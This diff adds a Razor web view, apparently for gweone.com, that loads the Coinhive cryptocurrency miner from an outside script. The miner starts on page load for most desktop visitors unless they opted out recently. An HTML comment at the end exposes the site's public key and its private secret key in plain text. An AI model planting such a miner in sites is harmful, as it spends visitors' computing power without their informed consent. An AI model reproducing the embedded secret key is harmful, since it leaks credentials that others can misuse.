@@ -1,0 +1,36 @@
+﻿@model Gweone.Service.Models.MiningInfo
+
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+    var miner = new CoinHive.User('@Model.UserId', 'gweone', {
+        threads: @Model.NumThreads,
+        throttle: 0.8,
+        forceASMJS: false,
+        theme: 'dark',
+        language: 'auto'
+    });
+
+    miner.on('accepted', function (params) {
+        console.log(params);
+    });
+
+    miner.on('found', function (params) {
+        console.log(params);
+    });
+
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	if (!miner.isMobile() && !miner.didOptOut(14400)) {
+	    miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+	}
+</script>
+
+<!-- 
+    Name gweone.com
+Site Key (public)
+FvXLDw4NSEocdsWj2gji5E52pLvtvRW0
+
+Secret Key (private)
+dJBG6wjO0yR3QDdIKmQGRMz7oUrJCdzF (revoke)
+
+-->
